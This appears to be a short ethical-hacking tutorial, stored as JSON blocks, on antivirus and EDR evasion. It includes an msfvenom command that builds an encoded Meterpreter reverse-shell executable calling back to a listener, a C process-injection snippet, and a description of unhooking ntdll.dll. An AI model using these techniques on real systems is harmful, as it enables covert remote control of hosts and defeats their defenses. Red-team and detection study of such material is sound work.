[{"order":1,"type":"heading","text":"Antivirus and EDR Evasion Techniques in Ethical Hacking"},{"order":2,"type":"paragraph","text":"Understanding how security solutions detect threats and how those detections can be bypassed is a fundamental skill for offensive security professionals and red teamers. This tutorial covers the primary concepts behind Antivirus (AV) and Endpoint Detection and Response (EDR) evasion."},{"order":3,"type":"subheading","text":"1. Understanding Detection Mechanisms"},{"order":4,"type":"paragraph","text":"Before attempting evasion, you must understand how modern security tools analyze files and behavior. AV solutions primarily rely on signature-based detection, static heuristics, and file reputation. EDR solutions take this a step further by monitoring process behavior, memory allocation, and API hooking in real-time."},{"order":5,"type":"bullet_point","text":"Signature Detection: Matching hashes or specific byte sequences against a database of known malware."},{"order":6,"type":"bullet_point","text":"Heuristic Analysis: Scanning files for suspicious characteristics, structures, or known malicious instruction patterns."},{"order":7,"type":"bullet_point","text":"Behavioral Monitoring: Observing system calls, process injections, network connections, and suspicious API usage dynamically."},{"order":8,"type":"subheading","text":"2. Obfuscation and Encoding"},{"order":9,"type":"paragraph","text":"To defeat static signatures, payloads are frequently obfuscated, encrypted, or encoded. The goal is to alter the binary structure and hash of the payload so it does not match known threat intelligence databases."},{"order":10,"type":"code","text":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x64/xor -i 3 -o payload.exe"},{"order":11,"type":"subheading","text":"3. In-Memory Execution and Process Injection"},{"order":12,"type":"paragraph","text":"Writing malicious files to disk is a quick way to get flagged. Modern evasion focuses on in-memory execution. Techniques like Process Hollowing and DLL Injection allow operators to execute payloads inside legitimate, trusted processes (such as explorer.exe or svchost.exe)."},{"order":13,"type":"code","text":"HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuf, payload, payloadSize, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, NULL);"},{"order":14,"type":"subheading","text":"4. API Hooking and Unhooking"},{"order":15,"type":"paragraph","text":"EDRs monitor user-mode API calls by placing "hooks" (typically a JMP instruction) at the beginning of functions in ntdll.dll or kernel32.dll. When an application calls an API, execution flows through the EDR first for inspection."},{"order":16,"type":"paragraph","text":"To bypass user-mode hooks, advanced loaders often read a fresh, unhooked copy of ntdll.dll directly from disk and overwrite the modified memory space in their own process."},{"order":17,"type":"subheading","text":"Summary"},{"order":18,"type":"paragraph","text":"AV and EDR evasion is an ongoing arms race between defenders and offensive security operators. While these techniques are used by red teams to test security controls, understanding them is essential for developing stronger detection rules and hardening enterprise networks."}]
